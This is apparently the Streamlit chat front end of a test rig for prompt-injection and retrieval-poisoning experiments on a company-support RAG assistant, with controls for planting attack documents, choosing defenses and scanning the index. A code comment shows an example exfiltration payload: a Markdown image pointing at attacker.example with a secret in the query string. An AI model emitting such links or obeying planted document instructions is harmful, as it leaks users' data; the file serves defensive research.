"""Streamlit chat UI for the Northwind Gadgets RAG assistant.

Run with: streamlit run app.py
"""

import streamlit as st

from rag import (
    DEFENSES,
    EXPECTED_ERRORS,
    INDEX_DEFENSES,
    answer,
    normalize_defenses,
    retrieved_files,
)
from ingest import list_attacks
from vectorstore import TOP_K, build_index, index_attacks, index_scan_info

# Page text: change these to reword the UI.
PAGE_TITLE = "Northwind Gadgets Support"
PAGE_CAPTION = "Ask questions about Northwind's policies. Answers come from the company docs."
ERROR_MESSAGE = "Couldn't answer this question."  # details are shown below it as plain text
CHUNKS_LABEL = "Retrieved chunks (what the model saw)"
MAX_K = 10  # upper end of the k slider

st.set_page_config(page_title=PAGE_TITLE)
st.title(PAGE_TITLE)
st.caption(PAGE_CAPTION)

# Sidebar: debugging controls for the attack experiments.
with st.sidebar:
    k = st.slider("Chunks to retrieve (k)", min_value=1, max_value=MAX_K, value=TOP_K)
    # none = baseline; normalized so the "Defenses:" line shows what really ran
    prompt_defenses = [d for d in DEFENSES if d not in INDEX_DEFENSES]
    defenses = list(normalize_defenses(st.multiselect("Defenses", prompt_defenses)))
    chosen_attacks = st.multiselect("Attack docs to include", list_attacks())
    # Index-time defense: it only takes effect when the index is rebuilt.
    scan_on = st.checkbox("Scan documents when rebuilding")
    # Rebuild after changing docs/, the attack selection or the scanner.
    if st.button("Rebuild index"):
        try:
            with st.spinner("Rebuilding..."):
                count = build_index(chosen_attacks, scan=scan_on)
        except EXPECTED_ERRORS as error:
            st.error("Rebuild failed.")
            st.text(str(error))
        else:
            st.success(f"Indexed {count} chunks.")

    # Always show what the index contains, so an attack can't stay active unnoticed.
    try:
        active = index_attacks()
    except EXPECTED_ERRORS:
        active = None
    if active is None:
        st.info("No index yet: click Rebuild index.")
    elif active:
        st.warning("Index contains attack docs:")
        st.text("\n".join(active))
    else:
        st.success("Index is clean (no attack docs).")

    # Scanner status: chunk ids and rule names are plain text (ids come from file names).
    if active is not None and (scan_info := index_scan_info())["scan"]:
        quarantined = scan_info["quarantined"]
        st.info(f"Scanner on: {len(quarantined)} chunks quarantined.")
        if quarantined:
            st.text("\n".join(f"{q['id']}: {', '.join(q['reasons'])}" for q in quarantined))

# Streamlit reruns this whole script on every interaction, so normal variables
# reset each time. session_state survives reruns, so the chat history lives there.
if "messages" not in st.session_state:
    st.session_state.messages = []

def show(message: dict) -> None:
    """Draw one chat message."""
    with st.chat_message(message["role"]):
        if message.get("error"):
            # st.error parses Markdown, so it only gets our own fixed text.
            st.error(ERROR_MESSAGE)
        # Plain text on purpose: Markdown would let a model answer like
        # ![](https://attacker.example/?code=SECRET) make the browser load
        # that URL automatically, leaking data without a click.
        st.text(message["content"])

        # File names and chunk text come from docs/, where attack documents will
        # be planted, so they are shown as plain text too (st.text / st.code).
        if chunks := message.get("chunks"):
            st.text(f"Retrieved files: {', '.join(retrieved_files(chunks))}")
            st.text(f"Defenses: {', '.join(message.get('defenses') or ['none'])}")
            with st.expander(CHUNKS_LABEL):  # expander labels parse Markdown: fixed text only
                for chunk in chunks:
                    st.text(f"{chunk['source']} #{chunk['chunk_index']} · distance {chunk['distance']:.3f}")
                    st.code(chunk["text"], language=None, wrap_lines=True)


def add(message: dict) -> None:
    """Save a message to the history and draw it."""
    st.session_state.messages.append(message)
    show(message)


# Redraw the conversation so far.
for message in st.session_state.messages:
    show(message)

# chat_input returns the new question once, on the rerun right after it's sent.
if question := st.chat_input("Ask about Northwind Gadgets"):
    add({"role": "user", "content": question})
    try:
        with st.spinner("Thinking..."):
            # Each question is answered on its own: the model doesn't see the history.
            text, chunks = answer(question, k, defenses)
    except EXPECTED_ERRORS as error:
        add({"role": "assistant", "content": f"Error: {error}", "error": True})
    else:
        # Save the chunks and defenses with the answer, so its panel survives redraws.
        add({"role": "assistant", "content": text, "chunks": chunks, "defenses": defenses})
